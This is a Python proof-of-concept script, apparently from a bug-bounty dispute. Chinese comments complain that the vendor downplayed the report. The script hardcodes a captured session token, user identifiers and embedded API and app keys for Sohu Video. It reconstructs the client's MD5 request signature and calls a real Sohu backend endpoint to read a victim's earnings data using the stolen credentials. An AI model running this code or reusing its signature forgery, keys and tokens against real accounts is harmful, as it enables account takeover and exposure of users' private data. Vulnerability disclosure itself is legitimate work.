




import hashlib
import requests
import time


#在这里修改窃取的认证信息，然后运行脚本
gid = "x0107402101018f230975986200041f884c4663fa2c0"
token = "eyJleHAiOjE3MjcyODEzNzYyNDAsImlhdCI6MTcxOTUwNTM3NjI0MCwicHAiOiIxODA2MzUzNjUwMDA0NjM5NzQ0QHNvaHUuY29tIiwidGsiOiJ1bmh1azJNbzVqU1lxcmpBRTdraDNWbWJCeXcwWHZJZyIsInYiOjB9.e36Ta6nWg2G-PjTpajsone-uYBbn-HwL_0OxuzW9iZU"
passport = "1806353650004639744@sohu.com"
uid = "SV_4IMDtFxlJVzVwh1xuSmHthGK5u9azvuBsp6loZr0Nxs"
#请求的接口，现在写的是获取收益信息的，证明签名没那么难
path = ""


def getTt():
        # 获取当前时间戳(毫秒)
    current_time_millis = int(time.time() * 1000)

    # 将时间戳转换为Long类型
    current_time_long = int(current_time_millis)
    return current_time_long

def f(input_str):
    return g(input_str, "upper")

def g(input_str, mode):
    md5_hash = hashlib.md5(input_str.encode()).digest()
    hex_str = "".join(b(byte, mode) for byte in md5_hash)
    return hex_str

def b(byte, mode):
    hex_str = f"{byte:02X}" if mode.lower() == "upper" else f"{byte:02x}"
    return hex_str


#通过token计算签名
def calcSign():
    time =    getTt()


    input_str = "abmode=1B_35B_91B_142A_152B_177B_202B_227A_262B_297B_304B_332A_339A_346B_353C_367B_381B_388B_395B_449B_v99989_9998C_s16_t10000&api_key=9854b2afa779e1a6bff1962447a09dbd&appid=107402&buildNo=06241948&gid={gid}&isApp=true&partner=750&passport={passport}&path=show&plat=6&poid=1&showType=0&ssl=1&sver=10.0.35&timestamp={timestamp}&token={token}&ua=SohuVideoMobile/10.0.35 (Platform/6)&uid={uid}&userAuth=0&app_key=tPpGsLBEIcVwx4y2".format(timestamp=time,uid = uid,gid = gid , token = token,passport = passport)

    # input_str = "hello world"
    hash_value = f(input_str)
    # print(f"Input: {input_str}")
    print("通过凭据计算签名, 这都不会嘛嘛嘛嘛嘛........")
    print(f"calc svsign ......... : {hash_value}\n")
    return hash_value,time


def request(svsign,timestamp):
    burp0_url = "https://coop.store.sohu.com:443/isp/comment/amt/show?gid={gid}&sver=10.0.35&userAuth=0&isApp=true&ua=SohuVideoMobile/10.0.35 (Platform/6)&buildNo=06241948&ssl=1&poid=1&token={token}&uid={uid}&partner=750&passport={passport}&api_key=9854b2afa779e1a6bff1962447a09dbd&appid=107402&showType=0&abmode=1B_35B_91B_142A_152B_177B_202B_227A_262B_297B_304B_332A_339A_346B_353C_367B_381B_388B_395B_449B_v99989_9998C_s16_t10000&plat=6".format(gid=gid,token=token,uid=uid,passport=passport)
    burp0_headers = {"Connection": "close", "plat": "6", "sver": "10.0.35", "svsign": svsign, "timestamp": str(timestamp), "traceparent": "00-018f20b385c53fdf0850283edf0fc933-018f20b385c53fdf-01", "User-Agent": "SohuVideoMobile/10.0.35 (Platform/6)", "Accept-Encoding": "gzip, deflate"}
    r = requests.get(burp0_url, headers=burp0_headers)
    print("利用凭据查询用户收益情况....\n")
    print("achieve resp from  backend.....\n",r.text)

if __name__ == "__main__":

    print(
        '''
                                                                                                                                                                                                                                                                                                                                 
                                                                                                                                                                           
             ||     ||          ||      ||             |        ||                           ||     |||               ||                  ||                 |||           
             ||      ||         ||      ||   |    ||  ||||   |||||                           ||     || ||             ||                  ||      |          ||     |      
             ||      ||   |     ||   ||||||||||    || || |||||||                            ||  |   ||  ||            ||          |||||||||||||||||         |||||||||      
             |||  |||||||||     || | || || ||||     |||  || ||||                            ||||||  ||   |         |  ||  |       ||||||||||||||||||       |||||||||||     
          |||||||||||||||||| ||||||| |||||   ||     |||  || ||||                            ||||||  ||  |||       ||| ||  |||        ||||||||||||         ||||    |||      
          ||||||||||| || ||   |||||||||||||||||    ||||  || ||||                           ||   | ||||||||        ||  ||    ||       ||||||||||||        ||  ||  |||       
             || |||||  |||      ||   ||||||||||   || ||  || ||||                           |||||||||||           ||   ||     |||     ||||||||||||       ||   || |||        
             || | ||    |||     ||   ||||||||||      ||| || ||||                           |||||||  ||    |      ||   ||      ||     ||||||||||||      ||     |||          
             ||||||||||||||     |||| ||||||||||     |||| || || |                          |  || |   || |||||    ||    ||   ||  |   ||||||||||||||           |||||          
            ||| | ||||||       |||   || ||   ||    || || || || ||                         |||||||||||||| |      |     ||   |||     |||||||||||||| |      ||||||||||||||    
          |||||      ||      ||||| |||||||||||     |  || || || ||                         ||||||||   |   ||    ||     ||  ||      |||||||||||||||||   ||||  |||||||||||    
          || ||      |        | ||  |||||||||||   ||  || || || ||                            ||      |  ||     |      || ||       ||||||||||||||||||       |||      ||     
             ||     |     |     ||    ||   ||    ||   || |  ||| ||       ||                  ||  |   ||||               ||         ||||||||||||||         |||||    ||      
             ||    ||     |     ||    ||| ||          ||||  ||||||      ||||                 || ||    ||   |           ||          ||||||||||||||        ||   || |||       
             ||   ||      ||    ||     ||||           ||||  |||||||      |||                 ||||   ||||  ||         |||                  ||   ||      ||     ||||         
             ||   ||||||||||    ||    |||||||||   ||||| |   || |||||      ||                 |||   ||  || ||       |||                 |  ||           |     ||||          
          |||||    ||||||||   ||||  |||    ||||||   || |    |  |         ||                 |||  ||     ||||    ||||                   |||||             |||||             
            ||                  |||||         |       |                 ||                   | ||         ||  |||                        ||           |||||                
                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                    
    '''
    )

    print(
        '''
1、一开始说装个app ，说麻烦，ok，报告里面我都说我可以远程打，怎么不自己确认下？ 
2、远程打了，又说没有获取敏感信息，登录凭据AT都不是敏感吗？ 只有手机号和身份证号才是敏感？ 用户凭据这个不是互联网基础概念吗
3、ok, 我又开始冷静下来，去解释这个凭据呢，其实是客户端与服务端交互用的，是用户中很重要的认证凭据，而且这个在整个安全业界都知道这个凭据的重要性，证明到这已经是能够表达漏洞危害了。
4、签名校验？？？？？签名是由客户端生成的，这个不也是黑客可以模拟这个过程产生吗？ 真的需要我为了那点赏金给你把安卓开发、web开发所有基础东西都写清楚吗？
        '''
        )
    

    svsign,timestamp =  calcSign()
    request(svsign=svsign,timestamp=timestamp)
